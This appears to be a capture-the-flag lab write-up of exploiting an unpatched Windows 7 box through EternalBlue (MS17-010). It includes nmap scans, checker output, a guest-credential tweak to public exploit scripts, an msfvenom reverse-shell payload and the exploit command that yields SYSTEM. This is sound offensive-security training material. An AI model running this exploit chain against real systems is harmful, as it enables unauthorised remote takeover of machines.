Then run `nmap` again with default scripts (`-sC`) and service discovery (`-sV`) on the ports that were found from the first scan.

Right away, we see some interesting information:

- SMB is enabled
- `guest` account is enabled
- OS is Windows 7
- Potential username: `haris`

Since it looks like we are possibly working with an outdated system, I'll run nmap's vulnerability scripts and see if we get anything from low hanging from fruit.

And we see that nmap is reporting this box as vulnerable to CVE-2017-0143, aka EternalBlue.

I was able to get a shell easily with Metasploit, although since I am prepping for the OSCP I will exploit this without Metasploit.

After messing around with some pocs, I came across [this repo](https://github.com/helviojunior/MS17-010/) which is a fork of one of the more popular [repos](https://github.com/worawit/MS17-010).

First, I test with `checker.py` and see denied access for the commonly used named pipes which this exploit uses:
```
$ python2 checker.py 10.129.76.113                                                                 1 тип
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
```

Since we know guest authentication is enabled from our nmap scan, I'll try setting the `USERNAME` variable in this script from `''` to `guest`.

![fc3a24ab76bc28fd3e7a63a3e287de11.png](../_resources/fc3a24ab76bc28fd3e7a63a3e287de11.png)

And run it again...

```
$ python2 checker.py 10.129.76.113
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (64 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (64 bit)
browser: STATUS_OBJECT_NAME_NOT_FOUND
```

And we get "Ok's" back for `samr`, `netlogon`, and `lsarpc` pipes. Now that we know this should be exploitable via named pipes as `guest`, we should also set var `USERNAME` to `guest` in `send_and_execute.py`

![55c555e95912551fac410e7f0a04261b.png](../_resources/55c555e95912551fac410e7f0a04261b.png)

Lastly, `send_and_execute.py` accepts an executable file as an argument to be used as a payload. We'll get this created with meterpreter using the following command:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe > rshell.exe`

Time to run the exploit!

`python2 send_and_execute.py 10.129.76.113 rshell.exe 445 lsarpc`

Annndddd just like that we are `NT AUTHORITY\SYSTEM`! We can collect our loot and move on to the next box :)
